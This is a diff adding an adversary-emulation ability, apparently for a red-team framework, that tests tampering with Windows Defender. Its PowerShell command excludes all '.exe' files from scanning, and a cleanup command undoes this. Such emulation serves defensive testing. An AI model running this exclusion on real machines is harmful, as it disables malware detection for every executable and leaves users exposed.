@@ -1,0 +1,20 @@
+---
+- id: e0946bc3b8b888d6c4cdf3f023fe3c0b
+  name: Tamper with Windows Defender Evade Scanning -Extension
+  description: "Malware can exclude specific extensions from being scanned and evading\
+    \ detection. \nUpon successful execution, the extension(s) should be on the list\
+    \ of excluded extensions.\nTo check the exclusion list using poweshell  (Get-MpPreference).ExclusionExtension.\n"
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685
+    name: Disable or Modify Tools
+  platforms:
+    windows:
+      psh:
+        command: $excludedExts= ".exe"; Add-MpPreference -ExclusionExtension  $excludedExts
+        payloads: []
+        cleanup: $excludedExts= ".exe"; Remove-MpPreference -ExclusionExtension  $excludedExts
+          -ErrorAction Ignore
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
